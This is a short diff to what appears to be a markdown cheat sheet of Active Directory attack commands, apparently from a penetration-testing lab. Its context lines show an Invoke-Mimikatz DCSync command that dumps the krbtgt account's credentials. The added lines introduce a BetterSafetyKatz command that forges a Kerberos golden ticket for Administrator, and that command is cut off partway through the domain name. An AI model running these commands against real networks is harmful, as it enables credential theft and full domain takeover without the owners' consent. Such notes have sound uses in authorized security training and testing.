@@ -25,3 +25,9 @@ Invoke-Mimikatz -Command '"lsadump::dcsync /user:<domain>\krbtgt"'
 ```
 Get-wmiobject -Class win32_operatingsystem -ComputerName <computername>
 ```
+
+#### BetterSafetyKatz Golden Ticket
+
+```
+C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /User:Administrator /domain:dollarcorp.mo
+```
